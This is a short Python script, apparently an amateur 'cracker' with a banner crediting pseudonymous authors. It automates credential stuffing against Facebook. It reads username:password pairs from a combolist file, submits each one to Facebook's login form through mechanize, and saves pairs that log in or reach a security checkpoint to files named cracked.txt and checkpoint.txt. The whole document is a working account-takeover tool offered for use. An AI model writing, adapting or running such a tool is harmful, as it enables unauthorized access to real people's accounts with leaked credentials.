import mechanize as mechanize
import requests

print(''''
''')
print("\033[0;93m=========================================")
print("\033[1;31msave combolist on this folder \033[0;36mcombo.txt ")
print("\033[1;93mStyle : AHMAD-REAL\n\n\033[1;93mDev : ABALAHB\n\n\033[1;93mCod : OMAR")
print("\033[0;93m=========================================")
combo = open("combo.txt", 'r')
while True:

    Combolist = combo.read().splitlines()
    for combo in Combolist:
        user = combo.split(':')[0]
        password = combo.split(':')[1]
        be = mechanize.Browser()
        be.set_handle_robots(False)
        be.open('https://www.facebook.com/login.php/')
        be.select_form(nr=0)
        be.form['email'] = user
        be.form['pass'] = password
        sup = be.submit()
        # if cracked grean
        if sup.geturl() == ('https://www.facebook.com/'):
            with open('cracked.txt', 'a') as crack:
                crack.write(str(user) + ':' + str(password) + '\n')
            print(('\033[1;94mcracked ' + str(user) + ':' + str(password)))
            # if checkpoint yalo
        elif sup.geturl() == ('https://www.facebook.com/checkpoint/?next'):
            with open('checkpoint.txt', 'a') as crack:
                crack.write(str(user) + ':' + str(password) + '\n')
            print(('\033[1;93mcheckpoint ' + str(user) + ':' + str(password)))
        else:
        	
        	print(('\033[1;93wrong ' + str(user) + ':' + str(password)))
